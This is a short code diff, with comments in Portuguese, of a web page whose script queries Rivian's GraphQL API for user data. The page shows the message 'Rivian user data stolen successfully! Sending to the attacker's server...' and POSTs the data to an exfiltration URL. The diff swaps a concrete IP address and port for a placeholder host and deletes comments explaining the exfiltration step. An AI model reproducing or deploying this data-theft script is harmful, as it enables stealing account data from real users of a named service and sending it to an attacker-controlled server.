@@ -11,7 +11,7 @@
 
   <script>
     const graphqlUrl = 'https://rivian.com/api/gql/gateway/graphql';
-    const exfilServerUrl = 'http://38.56.241.131:14455/log_data';
+    const exfilServerUrl = 'http://servidor_em_questão:14455/log_data';
 
     const query = `
         {
@@ -66,8 +66,6 @@
           statusDisplay.textContent = 'Dados do usuário Rivian roubados com sucesso! Enviando para o servidor do atacante...';
           console.log('Dados roubados (visíveis no navegador):', exfiltratedData);
 
-          // **PASSO DE EXFILTRAÇÃO PARA SEU SERVIDOR LOCAL**
-          // Note que aqui é uma requisição HTTP, não HTTPS, pois é para seu IP direto.
           fetch(exfilServerUrl, {
             method: 'POST',
             headers: {
